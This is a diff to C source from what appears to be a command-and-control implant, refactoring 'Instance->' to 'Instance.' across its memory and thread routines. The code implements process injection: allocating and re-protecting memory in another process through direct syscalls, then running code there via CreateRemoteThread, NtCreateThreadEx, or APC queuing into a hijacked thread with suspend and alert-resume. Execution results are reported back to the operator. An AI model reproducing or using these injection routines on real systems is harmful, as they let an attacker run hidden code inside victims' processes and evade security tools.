@@ -21,8 +21,8 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         {
             PUTS( "DX_MEM_DEFAULT" )
 
-            Memory = Instance->Config.Memory.Alloc != DX_MEM_DEFAULT ?
-                    MemoryAlloc( Instance->Config.Memory.Alloc, hProcess, MemSize, Protect ) :  // if the config memory alloc ain't default then use that
+            Memory = Instance.Config.Memory.Alloc != DX_MEM_DEFAULT ?
+                    MemoryAlloc( Instance.Config.Memory.Alloc, hProcess, MemSize, Protect ) :  // if the config memory alloc ain't default then use that
                     MemoryAlloc( DX_MEM_SYSCALL, hProcess, MemSize, Protect );  // if it is default then simply choose Native/Syscall
 
             return Memory;
@@ -31,7 +31,7 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         case DX_MEM_WIN32:
         {
             PRINTF( "VirtualAllocEx( %x, NULL, %ld, %ld, %ld ) => ", hProcess, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
-            Memory = Instance->Win32.VirtualAllocEx( hProcess, NULL, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
+            Memory = Instance.Win32.VirtualAllocEx( hProcess, NULL, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
 #ifdef DEBUG
             printf( "%p\n", Memory );
 #endif
@@ -41,14 +41,14 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         case DX_MEM_SYSCALL:
         {
             PRINTF( "NtAllocateVirtualMemory( %x, %p, %d, %p [%d], %d, %x ) => ", hProcess, &Memory, 0, &MemSize, MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
-            NtStatus = Instance->Syscall.NtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
+            NtStatus = Instance.Syscall.NtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
 #ifdef DEBUG
             printf( "%x\n", NtStatus );
 #endif
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PRINTF( "[-] NtAllocateVirtualMemory: Failed:[%lx]\n", NtStatus )
-                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                 return NULL;
             }
 
@@ -63,7 +63,7 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         }
     }
 
-    if ( Memory && Instance->Config.Implant.Verbose )
+    if ( Memory && Instance.Config.Implant.Verbose )
     {
         PUTS( "Memory" )
         PackageAddInt32( Package, Memory );
@@ -87,15 +87,15 @@ BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T
     {
         case DX_MEM_WIN32:
         {
-            Success = Instance->Win32.VirtualProtectEx( hProcess, Memory, MemSize, Protect, &OldProtect );
+            Success = Instance.Win32.VirtualProtectEx( hProcess, Memory, MemSize, Protect, &OldProtect );
         }
         case DX_MEM_SYSCALL:
         {
-            NtStatus = Instance->Syscall.NtProtectVirtualMemory( hProcess, &Memory, &MemSize, Protect, &OldProtect );
+            NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &Memory, &MemSize, Protect, &OldProtect );
 
             if ( ! NT_SUCCESS( NtStatus ) )
             {
-                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                 Success = FALSE;
             }
             else
@@ -109,7 +109,7 @@ BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T
         }
     }
 
-    if ( Success && Instance->Config.Implant.Verbose )
+    if ( Success && Instance.Config.Implant.Verbose )
     {
         PUTS( "Memory Protection" )
         PackageAddInt32( Package, Memory );
@@ -135,8 +135,8 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
         {
             PUTS( "DX_MEM_DEFAULT" )
 
-            Success = Instance->Config.Memory.Execute != DX_THREAD_DEFAULT ?
-                      ThreadCreate( Instance->Config.Memory.Execute, hProcess, EntryPoint, ctx ) :  // if the config memory execute ain't default then use that
+            Success = Instance.Config.Memory.Execute != DX_THREAD_DEFAULT ?
+                      ThreadCreate( Instance.Config.Memory.Execute, hProcess, EntryPoint, ctx ) :  // if the config memory execute ain't default then use that
                       ThreadCreate( DX_THREAD_SYSCALL, hProcess, EntryPoint, ctx );  // if it is default then simply choose Native/Syscall
 
             return Success;
@@ -144,7 +144,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
         case DX_THREAD_WIN32:
         {
             PUTS( "DX_THREAD_WIN32" );
-            Success = Instance->Win32.CreateRemoteThread( hProcess, NULL, 0, EntryPoint, ctx->Parameter, NULL, &ctx->ThreadID );
+            Success = Instance.Win32.CreateRemoteThread( hProcess, NULL, 0, EntryPoint, ctx->Parameter, NULL, &ctx->ThreadID );
             break;
         }
 
@@ -163,11 +163,11 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
             ThreadAttr.Entry.pValue     = &ClientId;
             ThreadAttr.Length           = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );
 
-            NtStatus = Instance->Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, NULL, NULL, NULL, &ThreadAttr );
+            NtStatus = Instance.Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, NULL, NULL, NULL, &ThreadAttr );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtCreateThreadEx: failed" )
-                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                 return FALSE;
             }
 
@@ -194,11 +194,11 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
                 PUTS( "Search for random thread" )
                 // TODO: change to Syscall
 
-                hSnapshot = Instance->Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
-                bResult   = Instance->Win32.Thread32First( hSnapshot, &threadEntry );
+                hSnapshot = Instance.Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
+                bResult   = Instance.Win32.Thread32First( hSnapshot, &threadEntry );
                 while ( bResult )
                 {
-                    bResult = Instance->Win32.Thread32Next( hSnapshot, &threadEntry );
+                    bResult = Instance.Win32.Thread32Next( hSnapshot, &threadEntry );
                     if ( bResult )
                     {
                         if ( threadEntry.th32OwnerProcessID == ctx->ProcessID )
@@ -215,19 +215,19 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
                             ProcClientID.UniqueProcess = ( HANDLE ) ctx->ProcessID;
                             ProcClientID.UniqueThread  = ( HANDLE ) threadId;
 
-                            Instance->Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
+                            Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
 
                             break;
                         }
                     }
                 }
 
-                Instance->Win32.NtClose( hSnapshot );
+                Instance.Win32.NtClose( hSnapshot );
             }
 
             if ( ctx->SuspendAwake )
             {
-                NtStatus = Instance->Syscall.NtSuspendThread( ctx->hThread, NULL );
+                NtStatus = Instance.Syscall.NtSuspendThread( ctx->hThread, NULL );
                 if ( ! NT_SUCCESS( NtStatus ) )
                 {
                     PUTS( "[-] NtSuspendThread: Failed" )
@@ -235,7 +235,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
                 }
             }
 
-            NtStatus = Instance->Syscall.NtQueueApcThread( ctx->hThread, EntryPoint, ctx->Parameter, NULL, NULL );
+            NtStatus = Instance.Syscall.NtQueueApcThread( ctx->hThread, EntryPoint, ctx->Parameter, NULL, NULL );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtQueueApcThread: Failed" )
@@ -246,11 +246,11 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
             // Alert the thread. trigger execution
             if ( ctx->SuspendAwake )
             {
-                NtStatus = Instance->Syscall.NtAlertResumeThread( ctx->hThread, NULL );
+                NtStatus = Instance.Syscall.NtAlertResumeThread( ctx->hThread, NULL );
                 if ( ! NT_SUCCESS( NtStatus ) )
                 {
                     PUTS( "[-] NtAlertResumeThread: Failed" );
-                    NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                    NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                     Success = FALSE;
                 } else PUTS( "[+] NtAlertResumeThread: Success" );
 
@@ -268,7 +268,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
 
     if ( Success )
     {
-        if ( Instance->Config.Implant.Verbose )
+        if ( Instance.Config.Implant.Verbose )
         {
             PUTS( "Success" )
             PackageAddInt32( Package, EntryPoint );
